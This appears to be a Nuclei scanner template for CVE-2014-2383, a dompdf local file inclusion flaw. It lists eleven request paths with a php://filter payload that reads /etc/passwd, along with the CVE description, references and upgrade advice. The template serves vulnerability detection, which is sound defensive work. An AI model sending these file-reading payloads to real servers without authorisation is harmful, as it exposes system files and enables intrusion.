http:
- matchers:
  - condition: and
    part: header
    type: word
    words:
    - application/pdf
    - filename="dompdf_out.pdf"
  - regex:
    - root:[x*]:0:0
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}{{paths}}'
  payloads:
    paths:
    - /dompdf.php?input_file=php://filter/resource=/etc/passwd
    - /PhpSpreadsheet/Writer/PDF/DomPDF.php?input_file=php://filter/resource=/etc/passwd
    - /lib/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd
    - /includes/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd
    - /wp-content/plugins/web-portal-lite-client-portal-secure-file-sharing-private-messaging/includes/libs/pdf/dompdf.php?input_file=php://filter/resource=/etc/passwd
    - /wp-content/plugins/buddypress-component-stats/lib/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd
    - /wp-content/plugins/abstract-submission/dompdf-0.5.1/dompdf.php?input_file=php://filter/resource=/etc/passwd
    - /wp-content/plugins/post-pdf-export/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd
    - /wp-content/plugins/blogtopdf/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd
    - /wp-content/plugins/gboutique/library/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd
    - /wp-content/plugins/wp-ecommerce-shop-styling/includes/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd
  stop-at-first-match: true
id: CVE-2014-2383
info:
  author: 0x_Akoko,akincibor,ritikchaddha
  classification:
    cpe: cpe:2.3:a:dompdf:dompdf:*:beta3:*:*:*:*:*:*
    cve-id: CVE-2014-2383
    cvss-metrics: CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P
    cvss-score: 6.8
    cwe-id: CWE-200
    epss-percentile: 0.97441
    epss-score: 0.44813
  description: 'A vulnerability in dompdf.php in dompdf before 0.6.1, when DOMPDF_ENABLE_PHP
    is enabled, allows context-dependent attackers to bypass chroot protections and
    read arbitrary files via a PHP protocol and wrappers in the input_file parameter,
    as demonstrated by a php://filter/read=convert.base64-encode/resource in the input_file
    parameter.

    '
  impact: 'The vulnerability can lead to unauthorized access to sensitive files, remote
    code execution, and compromise of the affected system.

    '
  metadata:
    max-request: 11
    product: dompdf
    vendor: dompdf
    verified: true
  name: Dompdf < v0.6.0 - Local File Inclusion
  reference:
  - https://www.exploit-db.com/exploits/33004
  - http://seclists.org/fulldisclosure/2014/Apr/258
  - https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-2383/
  - https://wpscan.com/vulnerability/1d64d0cb-6b71-47bb-8807-7c8350922582
  - https://nvd.nist.gov/vuln/detail/CVE-2014-2383
  remediation: 'Upgrade Dompdf to a version higher than v0.6.0 to mitigate the vulnerability.

    '
  severity: medium
  tags: cve2014,cve,lfi,wp-plugin,wpscan,dompdf,wordpress,wp,edb,seclists,vkev,vuln
